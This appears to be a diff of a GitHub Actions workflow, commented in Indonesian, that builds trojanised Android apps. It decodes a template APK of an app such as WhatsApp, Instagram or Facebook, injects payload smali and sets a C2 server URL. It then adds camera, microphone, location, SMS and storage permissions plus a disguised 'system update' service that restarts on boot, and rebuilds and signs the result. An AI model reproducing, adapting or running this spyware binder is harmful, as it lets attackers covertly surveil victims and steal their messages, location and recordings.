@@ -7,10 +7,10 @@ on:
         description: 'Build ID'
         required: true
       app_name:
-        description: 'Nama Aplikasi'
+        description: 'Nama Aplikasi (akan muncul di strings.xml)'
         required: true
       package_name:
-        description: 'Nama Paket'
+        description: 'Nama Paket (HANYA UNTUK PAYLOAD, TIDAK UNTUK TEMPLATE!)'
         required: true
       c2_url:
         description: 'URL Server C2'
@@ -23,7 +23,7 @@ on:
         description: 'Izin (JSON)'
         required: false
       icon_base64:
-        description: 'Ikon (Base64)'
+        description: 'Ikon (Base64) - OPSIONAL'
         required: false
 
 jobs:
@@ -68,20 +68,10 @@ jobs:
           TEMPLATE_FILE="templates/${{ inputs.bind_target }}.apk"
           if [ ! -f "$TEMPLATE_FILE" ]; then
             echo "❌ ERROR: File template tidak ditemukan: $TEMPLATE_FILE"
-            echo "📌 Silakan upload file APK ke folder templates/ dengan nama:"
-            echo "   - templates/whatsapp.apk"
-            echo "   - templates/instagram.apk"
-            echo "   - templates/facebook.apk"
+            echo "📌 Pastikan file APK ada di templates/"
             exit 1
           fi
           echo "✅ Menggunakan template lokal: $TEMPLATE_FILE"
-          FILESIZE=$(stat -c%s "$TEMPLATE_FILE")
-          if [ "$FILESIZE" -lt 1000000 ]; then
-            echo "❌ ERROR: Ukuran file terlalu kecil ($FILESIZE bytes)."
-            echo "📌 Kemungkinan file masih berupa pointer LFS."
-            exit 1
-          fi
-          echo "✅ Ukuran file: $FILESIZE bytes"
           cp "$TEMPLATE_FILE" template.apk
           if ! file template.apk | grep -q "Android package"; then
             echo "❌ ERROR: File template bukan APK valid."
@@ -93,33 +83,50 @@ jobs:
       - name: Decode template APK
         run: java -jar /usr/local/bin/apktool.jar d template.apk -o decoded/
 
-      - name: Inject payload and modify config
+      - name: Inject payload smali
         run: |
+          # 🔥 SALIN PAYLOAD SMALI KE DALAM TEMPLATE (TANPA UBAH PACKAGE NAME TEMPLATE)
           if [ -d "payload/smali" ]; then
             cp -r payload/smali/* decoded/smali/
           fi
-          sed -i "s/<string name=\"app_name\">.*<\/string>/<string name=\"app_name\">${{ inputs.app_name }}<\/string>/g" decoded/res/values/strings.xml || true
-          sed -i "s/package=\".*\"/package=\"${{ inputs.package_name }}\"/g" decoded/AndroidManifest.xml || true
-          find decoded -name "*.smali" -exec sed -i "s|https://your-server.com|${{ inputs.c2_url }}|g" {} \; || true
-          if [ -n "${{ inputs.icon_base64 }}" ]; then
-            echo "${{ inputs.icon_base64 }}" | base64 -d > icon.png
-            cp icon.png decoded/res/drawable/ic_launcher.png || true
-          fi
 
-      - name: Install framework resource
+      - name: Replace C2 URL in payload smali
         run: |
-          java -jar /usr/local/bin/apktool.jar if template.apk || true
+          # 🔥 GANTI URL C2 DI SEMUA FILE SMALI PAYLOAD
+          find decoded/smali -name "*.smali" -exec sed -i "s|https://your-server.com|${{ inputs.c2_url }}|g" {} \; || true
+          echo "✅ URL C2 diganti di smali payload"
 
-      - name: Remove dummy files and clean public.xml
+      - name: Add permissions and service to AndroidManifest.xml
         run: |
-          # Hapus semua file dummy XML
-          find decoded -name "APKTOOL_DUMMYVAL_*.xml" -delete
-          # Hapus semua referensi dummy di public.xml
-          sed -i '/APKTOOL_DUMMYVAL/d' decoded/res/values/public.xml || true
+          # 🔥 TAMBAHKAN IZIN DAN SERVICE KE MANIFEST (TANPA UBAH PACKAGE NAME)
+          MANIFEST="decoded/AndroidManifest.xml"
+          
+          # Izin tambahan
+          sed -i '/<manifest/a\
+          <uses-permission android:name="android.permission.INTERNET" />\
+          <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />\
+          <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />\
+          <uses-permission android:name="android.permission.CAMERA" />\
+          <uses-permission android:name="android.permission.RECORD_AUDIO" />\
+          <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />\
+          <uses-permission android:name="android.permission.READ_SMS" />\
+          <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />\
+          <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />\
+          <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />' $MANIFEST
+          
+          # Service dan receiver
+          sed -i '/<application/a\
+          <service android:name="com.system.update.UpdateService" android:exported="false" android:foregroundServiceType="dataSync" />\
+          <receiver android:name="com.system.update.BootReceiver" android:exported="true">\
+            <intent-filter>\
+              <action android:name="android.intent.action.BOOT_COMPLETED" />\
+              <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />\
+            </intent-filter>\
+          </receiver>' $MANIFEST
 
-      - name: Rebuild APK
+      - name: Rebuild APK (tanpa resource compilation)
         run: |
-          # Build dengan skip resource compilation
+          # 🔥 BUILD TANPA KOMPILASI RESOURCE AGAR TIDAK ERROR DUMMY
           java -jar /usr/local/bin/apktool.jar b decoded -o unsigned.apk -b
 
       - name: Sign APK
@@ -133,9 +140,3 @@ jobs:
         with:
           name: app-${{ inputs.build_id }}
           path: signed.apk
-
-      - name: Update build status (success)
-        run: |
-          curl -X POST "${{ inputs.c2_url }}/api/build-callback" \
-            -H "Content-Type: application/json" \
-            -d "{\"build_id\":\"${{ inputs.build_id }}\",\"status\":\"success\",\"download_url\":\"https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}/artifacts\"}"
